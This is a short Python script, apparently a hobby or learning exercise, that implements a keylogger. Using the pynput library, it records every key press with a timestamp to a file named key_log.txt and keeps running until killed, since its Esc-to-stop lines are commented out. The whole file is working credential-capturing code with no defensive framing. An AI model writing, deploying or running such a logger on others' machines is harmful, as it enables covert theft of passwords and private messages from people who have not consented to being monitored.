from pynput.keyboard import Key, Listener
import logging 

def keylogger():
    # If no nam eit gets put into an empty string
    log_dir = ""

    # This is the basic logging function
    logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s: ')

    # This is form the library
    def on_press(key):
        logging.info(str(key))
        # if key == Key.esc:
        # Stop Listener
        #     return false

    # This says, listener is on
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    keylogger()




